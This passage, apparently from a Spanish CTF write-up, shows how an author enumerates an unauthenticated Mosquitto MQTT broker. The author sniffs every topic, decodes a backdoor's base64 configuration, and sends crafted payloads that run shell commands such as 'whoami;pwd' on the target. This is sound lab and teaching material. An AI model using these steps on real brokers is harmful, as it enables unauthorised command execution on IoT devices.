-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">bytes</span><span class="o">/</span><span class="n">received</span><span class="o">/</span><span class="mi">15</span><span class="ss">min</span><span class="p">:</span> <span class="mi">2955</span><span class="o">.</span><span class="mi">82</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">clients</span><span class="o">/</span><span class="ss">total</span><span class="p">:</span> <span class="mi">2</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>    <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">connections</span><span class="o">/</span><span class="mi">15</span><span class="ss">min</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">15</span>
-</span></span><span class="line"><span class="cl"><span class="no">Service</span> <span class="ss">Info</span><span class="p">:</span> <span class="ss">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="ss">CPE</span><span class="p">:</span> <span class="ss">cpe</span><span class="p">:</span><span class="sr">/o:linux:linux_kernel
-</span></span></span><span class="line"><span class="cl"><span class="sr">
-</span></span></span><span class="line"><span class="cl"><span class="sr">Service detection performed. Please report any incorrect results at https:/</span><span class="o">/</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="ss">done</span><span class="p">:</span> <span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mi">32</span><span class="o">.</span><span class="mi">97</span> <span class="n">seconds</span></span></span></code></pre></div>
-<p>Ahora bien, investiguemos que es ese servicio llamado <strong>Mosquitto</strong>:</p>
-<blockquote>
-<p>&ldquo;Mosquitto es un servidor (o bróker) de mensajes de código abierto que implementa el protocolo MQTT. Actúa como un intermediario que permite a diferentes dispositivos y aplicaciones (publicadores y suscriptores) comunicarse entre sí de manera eficiente, especialmente útil en el Internet de las Cosas (IoT) debido a la ligereza del protocolo MQTT. Mosquitto facilita la transmisión de mensajes en un modelo de publicación/suscripción (pub/sub), donde los publicadores envían mensajes a temas y los suscriptores reciben esos mensajes de los temas a los que se han suscrito.&rdquo; - Geminis AI</p></blockquote>
-<p>Ahora bien, procedemos a hacerle una auditoría al servicio <strong>MQTT</strong>, instalamos en nuestra máquina atacante, <code>mosquito_sub</code> y <code>mosquito_pub</code>, y clonamos <a href="https://github.com/Red-Alert-Labs/ralmqtt/"  class="external-link" target="_blank" rel="noopener">RALMQTT</a>.</p>
-<p>Ejecutamos RALMQTT</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python ralmqtt.py -m discovery -a 10.201.64.81</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="o">--------------------------------------------------------------------------</span>
-</span></span><span class="line"><span class="cl">  <span class="n">_____</span>            <span class="n">_</span>      <span class="n">__</span>  <span class="n">__</span>  <span class="n">____</span> <span class="n">_______</span> <span class="n">_______</span>
-</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="n">__</span> <span class="p">\</span>     <span class="sr">/\   | |    |  \/  |/</span> <span class="n">__</span> <span class="p">\</span><span class="n">__</span>   <span class="n">__</span><span class="o">|</span><span class="n">__</span>   <span class="n">__</span><span class="o">|</span>
-</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="o">|</span><span class="n">__</span><span class="p">)</span> <span class="o">|</span>   <span class="o">/</span>  <span class="p">\</span>  <span class="o">|</span> <span class="o">|</span>    <span class="o">|</span> <span class="p">\</span>  <span class="o">/</span> <span class="o">|</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>     <span class="o">|</span> <span class="o">|</span>
-</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="n">_</span>  <span class="o">/</span>   <span class="o">/</span> <span class="sr">/\ \ | |    | |\/| | |  | | | |     | |
-</span></span></span><span class="line"><span class="cl"><span class="sr"> | | \ \  /</span> <span class="n">____</span> <span class="p">\</span><span class="o">|</span> <span class="o">|</span><span class="n">____</span><span class="o">|</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">__</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>     <span class="o">|</span> <span class="o">|</span>
-</span></span><span class="line"><span class="cl"> <span class="o">|</span><span class="n">_</span><span class="o">|</span>  <span class="p">\</span><span class="n">_</span><span class="p">\</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>    <span class="p">\</span><span class="n">_</span><span class="p">\</span><span class="n">______</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="p">\</span><span class="n">___</span><span class="p">\</span><span class="n">_</span><span class="p">\</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>     <span class="o">|</span><span class="n">_</span><span class="o">|</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="no">Made</span> <span class="n">by</span> <span class="n">eddym</span><span class="vi">@lou</span> <span class="sr">//</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//</span><span class="n">www</span><span class="o">.</span><span class="n">redalertlabs</span><span class="o">.</span><span class="n">com</span>
-</span></span><span class="line"><span class="cl"><span class="no">Your</span> <span class="no">IoT</span> <span class="no">Cybersecurity</span> <span class="no">Trusted</span> <span class="no">Partner</span>
-</span></span><span class="line"><span class="cl"><span class="no">Bringing</span> <span class="no">Trust</span> <span class="n">to</span> <span class="n">the</span> <span class="no">Internet</span> <span class="n">of</span> <span class="no">Things</span>
-</span></span><span class="line"><span class="cl"><span class="no">RALMQTT</span> <span class="n">is</span> <span class="n">a</span> <span class="n">python</span> <span class="n">based</span> <span class="n">tool</span> <span class="n">designed</span> <span class="k">for</span> <span class="no">MQTT</span> <span class="n">pentesting</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">--------------------------------------------------------------------------</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="no">Broker</span> <span class="ss">Address</span><span class="p">:</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">64</span><span class="o">.</span><span class="mi">81</span>
-</span></span><span class="line"><span class="cl"><span class="no">Broker</span> <span class="ss">Port</span><span class="p">:</span> <span class="mi">1883</span>
-</span></span><span class="line"><span class="cl"><span class="no">Broker</span> <span class="ss">Password</span><span class="p">:</span> <span class="no">None</span>
-</span></span><span class="line"><span class="cl"><span class="no">Broker</span> <span class="ss">User</span><span class="p">:</span> <span class="no">None</span>
-</span></span><span class="line"><span class="cl"><span class="no">Attack</span> <span class="ss">Mode</span><span class="p">:</span> <span class="n">discovery</span>
-</span></span><span class="line"><span class="cl"><span class="o">[!]</span> <span class="no">Entering</span> <span class="n">discovery</span> <span class="n">mode</span> <span class="o">[!]</span>
-</span></span><span class="line"><span class="cl"><span class="no">No</span> <span class="n">authentication</span> <span class="n">mechanism</span> <span class="n">is</span> <span class="n">implemented</span> <span class="ow">or</span> <span class="n">valid</span> <span class="n">credentials</span> <span class="p">:</span> <span class="n">successfully</span> <span class="n">connected</span>
-</span></span><span class="line"><span class="cl"><span class="no">Subscribing</span> <span class="n">to</span> <span class="n">the</span> <span class="vg">$SYS</span><span class="o">/</span><span class="c1"># topic hierarchy for footprinting...</span>
-</span></span><span class="line"><span class="cl"><span class="no">Messages</span> <span class="n">received</span> <span class="n">on</span> <span class="vg">$SYS</span><span class="o">/</span><span class="c1"># topics. The topic is accessible. </span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="no">Broker_Version</span> <span class="p">:</span> <span class="n">mosquitto</span> <span class="n">version</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">14</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="no">Uptime</span> <span class="p">:</span> <span class="mi">2519</span> <span class="n">seconds</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="no">Connected_clients</span> <span class="p">:</span> <span class="mi">2</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="no">Received_Messages_1_Minute</span> <span class="p">:</span> <span class="mi">93</span><span class="o">.</span><span class="mi">85</span></span></span></code></pre></div>
-<p>No tiene mecanismo de autenticación, o sea que solo debemos conectarnos al servidor y colocarnos en modo escucha en un tópico especifico, pero nos ponemos en escucha en todos los tópicos:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mosquitto_sub -h 10.201.64.81 -t <span class="s1">&#39;#&#39;</span></span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">14921951914159204648</span><span class="p">,</span><span class="s2">&#34;gain&#34;</span><span class="p">:</span><span class="mi">59</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="n">eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ</span><span class="o">==</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">13251117175332931824</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">24</span><span class="o">.</span><span class="mi">486698</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">4995570295506588961</span><span class="p">,</span><span class="s2">&#34;color&#34;</span><span class="ss">:&#34;PURPLE&#34;</span><span class="p">,</span><span class="s2">&#34;status&#34;</span><span class="ss">:&#34;OFF&#34;</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">7523735876140762080</span><span class="p">,</span><span class="s2">&#34;in_use&#34;</span><span class="ss">:false</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">142</span><span class="o">.</span><span class="mi">27681</span><span class="p">,</span><span class="s2">&#34;toast_time&#34;</span><span class="p">:</span><span class="mi">263</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">10752660886038971563</span><span class="p">,</span><span class="s2">&#34;yaxis&#34;</span><span class="ss">:-</span><span class="mi">55</span><span class="o">.</span><span class="mi">085274</span><span class="p">,</span><span class="s2">&#34;xaxis&#34;</span><span class="p">:</span><span class="mi">159</span><span class="o">.</span><span class="mi">61578</span><span class="p">,</span><span class="s2">&#34;zoom&#34;</span><span class="p">:</span><span class="mi">3</span><span class="o">.</span><span class="mi">7765393</span><span class="p">,</span><span class="s2">&#34;movement&#34;</span><span class="ss">:false</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">6969632319201599276</span><span class="p">,</span><span class="s2">&#34;gain&#34;</span><span class="p">:</span><span class="mi">41</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">14740914807410967904</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">23</span><span class="o">.</span><span class="mi">94953</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">4816665109720549666</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">24</span><span class="o">.</span><span class="mi">40741</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">12914864508750389800</span><span class="p">,</span><span class="s2">&#34;gain&#34;</span><span class="p">:</span><span class="mi">45</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">5450592140510537249</span><span class="p">,</span><span class="s2">&#34;color&#34;</span><span class="ss">:&#34;PURPLE&#34;</span><span class="p">,</span><span class="s2">&#34;status&#34;</span><span class="ss">:&#34;ON&#34;</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">7272344814928664096</span><span class="p">,</span><span class="s2">&#34;in_use&#34;</span><span class="ss">:true</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">153</span><span class="o">.</span><span class="mi">9174</span><span class="p">,</span><span class="s2">&#34;toast_time&#34;</span><span class="p">:</span><span class="mi">360</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">17207880952866235814</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">23</span><span class="o">.</span><span class="mi">229897</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">11787558305197886171</span><span class="p">,</span><span class="s2">&#34;yaxis&#34;</span><span class="ss">:-</span><span class="mi">144</span><span class="o">.</span><span class="mo">0203</span><span class="mi">9</span><span class="p">,</span><span class="s2">&#34;xaxis&#34;</span><span class="ss">:-</span><span class="mi">82</span><span class="o">.</span><span class="mi">35095</span><span class="p">,</span><span class="s2">&#34;zoom&#34;</span><span class="p">:</span><span class="mi">1</span><span class="o">.</span><span class="mi">5777023</span><span class="p">,</span><span class="s2">&#34;movement&#34;</span><span class="ss">:false</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">362540386312205955</span><span class="p">,</span><span class="s2">&#34;gain&#34;</span><span class="p">:</span><span class="mi">53</span><span class="p">}</span>                                                      
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">15714029982213522667</span><span class="p">,</span><span class="s2">&#34;color&#34;</span><span class="ss">:&#34;BLUE&#34;</span><span class="p">,</span><span class="s2">&#34;status&#34;</span><span class="ss">:&#34;OFF&#34;</span><span class="p">}</span>                                
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">3225961129491872569</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">24</span><span class="o">.</span><span class="mo">01401</span><span class="mi">9</span><span class="p">}</span>                                       
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">6359058373619665251</span><span class="p">,</span><span class="s2">&#34;in_use&#34;</span><span class="ss">:true</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">150</span><span class="o">.</span><span class="mi">87917</span><span class="p">,</span><span class="s2">&#34;toast_time&#34;</span><span class="p">:</span><span class="mi">355</span><span class="p">}</span>        
-</span></span><span class="line"><span class="cl"><span class="n">eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ</span><span class="o">==</span>           
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">8925898765875057015</span><span class="p">,</span><span class="s2">&#34;gain&#34;</span><span class="p">:</span><span class="mi">48</span><span class="p">}</span>                                                     
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">2001014962008406095</span><span class="p">,</span><span class="s2">&#34;color&#34;</span><span class="ss">:&#34;GREEN&#34;</span><span class="p">,</span><span class="s2">&#34;status&#34;</span><span class="ss">:&#34;ON&#34;</span><span class="p">}</span>                                 
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">8547104042568522656</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">23</span><span class="o">.</span><span class="mi">311316</span><span class="p">}</span>                                       
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">14895217707509815085</span><span class="p">,</span><span class="s2">&#34;in_use&#34;</span><span class="ss">:true</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">140</span><span class="o">.</span><span class="mi">93825</span><span class="p">,</span><span class="s2">&#34;toast_time&#34;</span><span class="p">:</span><span class="mi">256</span><span class="p">}</span>       
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">1184916321032100268</span><span class="p">,</span><span class="s2">&#34;yaxis&#34;</span><span class="p">:</span><span class="mi">9</span><span class="o">.</span><span class="mo">07</span><span class="mi">9117</span><span class="p">,</span><span class="s2">&#34;xaxis&#34;</span><span class="ss">:-</span><span class="mi">152</span><span class="o">.</span><span class="mi">9006</span><span class="p">,</span><span class="s2">&#34;zoom&#34;</span><span class="p">:</span><span class="mi">4</span><span class="o">.</span><span class="mi">1694174</span><span class="p">,</span><span class="s2">&#34;movement&#34;</span><span class="ss">:false</span><span class="p">}</span>                                                                          
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">14470891104289638540</span><span class="p">,</span><span class="s2">&#34;gain&#34;</span><span class="p">:</span><span class="mi">69</span><span class="p">}</span>                                                    
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">5335963935520223638</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">24</span><span class="o">.</span><span class="mi">225779</span><span class="p">}</span>                                       
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">10084623511089974040</span><span class="p">,</span><span class="s2">&#34;color&#34;</span><span class="ss">:&#34;GREEN&#34;</span><span class="p">,</span><span class="s2">&#34;status&#34;</span><span class="ss">:&#34;OFF&#34;</span><span class="p">}</span> </span></span></code></pre></div>
-<p>Tenemos un texto codificado en <strong>Base64</strong>, descifremos a ver que dice:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> jq</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;registered_commands&#34;</span><span class="p">:</span> <span class="p">[</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;HELP&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CMD&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;SYS&#34;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">],</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;pub_topic&#34;</span><span class="p">:</span> <span class="s2">&#34;U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;sub_topic&#34;</span><span class="p">:</span> <span class="s2">&#34;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>
-<p>Parece que el servidor tiene un dispositivo con una configuración de ejecución remota de comandos(RCE), probemos:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nos ponemos en escucha en este tópico</span>
-</span></span><span class="line"><span class="cl">mosquitto_sub -h 10.201.28.145 -t <span class="s2">&#34;U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Ejecutamos un comando permitido en ese tópico -&gt; HELP</span>
-</span></span><span class="line"><span class="cl">mosquitto_pub -h 10.201.28.145 -t <span class="s1">&#39;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&#39;</span> -m <span class="s1">&#39;HELP&#39;</span></span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="no">SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ</span><span class="o">+</span><span class="no">IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk</span><span class="o">=</span></span></span></code></pre></div>
-<p>Nos regresa un texto codificado en <strong>Base64</strong>, lo decodificamos:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=&#39;</span> <span class="p">|</span> base64 -d<span class="p">;</span>echo</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Invalid message format.
-</span></span><span class="line"><span class="cl">Format: base64({&#34;id&#34;: &#34;&lt;backdoor id&gt;&#34;, &#34;cmd&#34;: &#34;&lt;command&gt;&#34;, &#34;arg&#34;: &#34;&lt;argument&gt;&#34;})</span></span></code></pre></div>
-<p>Nos muestra que debemos enviar el payload en un formato en especifico.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Payload</span>
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;{&#34;id&#34;: &#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;, &#34;cmd&#34;: &#34;HELP&#34;, &#34;arg&#34;: &#34;&#34;}&#39;</span> <span class="p">|</span> base64 /* <span class="nv">eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkhFTFAiLCAiYXJnIjogIiJ9Cg</span><span class="o">==</span> */
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Enviamos </span>
-</span></span><span class="line"><span class="cl">mosquitto_pub -h 10.201.28.145 -t <span class="s1">&#39;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&#39;</span> -m <span class="s1">&#39;eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkhFTFAiLCAiYXJnIjogIiJ9Cg==&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Decodificamos la respuesta</span>
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTWVzc2FnZSBmb3JtYXQ6XG4gICAgQmFzZTY0KHtcbiAgICAgICAgXCJpZFwiOiBcIjxCYWNrZG9vciBJRD5cIixcbiAgICAgICAgXCJjbWRcIjogXCI8Q29tbWFuZD5cIixcbiAgICAgICAgXCJhcmdcIjogXCI8YXJnPlwiLFxuICAgIH0pXG5cbkNvbW1hbmRzOlxuICAgIEhFTFA6IERpc3BsYXkgaGVscCBtZXNzYWdlICh0YWtlcyBubyBhcmcpXG4gICAgQ01EOiBSdW4gYSBzaGVsbCBjb21tYW5kXG4gICAgU1lTOiBSZXR1cm4gc3lzdGVtIGluZm9ybWF0aW9uICh0YWtlcyBubyBhcmcpXG4ifQ==&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> jq</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;response&#34;</span><span class="p">:</span> <span class="s2">&#34;Message format:\n    Base64({\n        \&#34;id\&#34;: \&#34;&lt;Backdoor ID&gt;\&#34;,\n        \&#34;cmd\&#34;: \&#34;&lt;Command&gt;\&#34;,\n        \&#34;arg\&#34;: \&#34;&lt;arg&gt;\&#34;,\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>
-<p>Ya entendemos como funciona, creamos otra vez otro payload y seguimos en escucha con <strong>mosquitto_sub</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Payload</span>
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;{&#34;id&#34;: &#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;, &#34;cmd&#34;: &#34;CMD&#34;, &#34;arg&#34;: &#34;whoami;pwd&#34;}&#39;</span> <span class="p">|</span> base64 /* <span class="nv">eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAid2hvYW1pO3B3ZCJ9Cg</span><span class="o">==</span> */
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Enviamos</span>
-</span></span><span class="line"><span class="cl">mosquitto_pub -h 10.201.28.145 -t <span class="s1">&#39;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&#39;</span> -m <span class="s1">&#39;eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAid2hvYW1pO3B3ZCJ9Cg==&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Decodificamos la respuesta</span>
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiY2hhbGxlbmdlXG4vaG9tZS9jaGFsbGVuZ2VcbiJ9&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> jq</span></span></code></pre></div>
